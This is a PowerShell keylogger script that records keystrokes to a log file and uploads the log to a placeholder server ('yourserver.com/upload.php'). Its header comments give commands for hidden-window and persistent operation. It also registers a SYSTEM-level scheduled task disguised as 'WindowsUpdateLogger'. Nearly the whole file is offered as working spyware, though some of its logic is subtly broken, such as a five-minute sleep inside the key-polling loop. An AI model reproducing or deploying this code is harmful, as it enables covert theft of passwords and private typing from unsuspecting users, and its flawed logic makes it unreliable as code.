
# Logs all keystrokes and runs in background (stealth mode)
# Run in Normal Mode (.\keylogger.ps1)
# Run in Stealth Mode Hidden Window (powershell -WindowStyle Hidden -File .\keylogger.ps1 -Hidden)
# Run as a Persistent Keylogger Auto-start on Boot (powershell -WindowStyle Hidden -File .\keylogger.ps1 -Persist)
# Stop the Keylogger (ctrl+shift+x )or(Stop-Process -Name "powershell" -Force)

param (
    [string]$LogFile = "C:\Users\HB47x\myproj\key\keystrokes.log",  # Change log file path as needed
    [string]$ServerURL = "http://yourserver.com/upload.php",  # Your server URL to handle the upload
    [switch]$Hidden,  # Runs in hidden mode
    [switch]$Persist  # Adds as a Scheduled Task (Auto-start)
)
# Hide Window if -Hidden flag is used
if ($Hidden) {
    $hideWindow = New-Object -ComObject WScript.Shell
    $hideWindow.Popup("", 0, "", 0x40000)  # Hides window
}
# Load Windows Forms and Input Assemblies
Add-Type -AssemblyName System.Windows.Forms
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@ -Language CSharp
# Write initial log header
"Keylogger Simulation Started at $(Get-Date)`n" | Out-File -Append $LogFile
Write-Host "Keylogger is running. Press 'CTRL + SHIFT + X' to stop." -ForegroundColor Green
# Function to Upload Log to Server
function Upload-LogToServer {
    param (
        [string]$ServerURL, 
        [string]$LogFile
    )
    try {
        # Prepare the file content
        $fileContent = Get-Content -Path $LogFile -Raw
        $boundary = [System.Guid]::NewGuid().ToString()
        # Prepare HTTP request headers and body
        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }
        $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="keystrokes.log"
Content-Type: text/plain
$fileContent
--$boundary--
"@
        # Send the HTTP POST request
        $response = Invoke-RestMethod -Uri $ServerURL -Method Post -Headers $headers -Body $body -ContentType "multipart/form-data; boundary=$boundary"
        Write-Host "Log uploaded to server" -ForegroundColor Green
    } catch {
        Write-Host "Error uploading log: $_" -ForegroundColor Red
    }
}
# Keylogger Loop (Capture Keystrokes)
while ($true) {
    Start-Sleep -Seconds 300  # Wait for 5 minute before uploading the log
    # Upload the log file to the server every 1 minute
    Upload-LogToServer -ServerURL $ServerURL -LogFile $LogFile
    # Check for each key (ASCII 8 to 255)
    for ($i = 8; $i -lt 256; $i++) {
        if ([KeyLogger]::GetAsyncKeyState($i) -ne 0) {
            $Key = [System.Windows.Forms.Keys]$i
            $KeyStroke = "$(Get-Date -Format 'HH:mm:ss') - $Key"
            # Log keystroke to file
            $KeyStroke | Out-File -Append $LogFile
        }
    }
    # Stop Keylogger if 'CTRL + SHIFT + X' is pressed
    if (([KeyLogger]::GetAsyncKeyState(0x11) -ne 0) -and  # CTRL
        ([KeyLogger]::GetAsyncKeyState(0x10) -ne 0) -and  # SHIFT
        ([KeyLogger]::GetAsyncKeyState(0x58) -ne 0)) {    # X
        Write-Host "`nKeylogger stopped by user." -ForegroundColor Red
        "Keylogger Stopped at $(Get-Date)`n" | Out-File -Append $LogFile
        break
    }
}
# If -Persist is enabled, add to Scheduled Task
if ($Persist) {
    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File $($MyInvocation.MyCommand.Path)"
    $TaskTrigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -Action $TaskAction -Trigger $TaskTrigger -TaskName "WindowsUpdateLogger" -User "SYSTEM" -RunLevel Highest -Force
    Write-Host "Keylogger added as a Scheduled Task!" -ForegroundColor Yellow
}
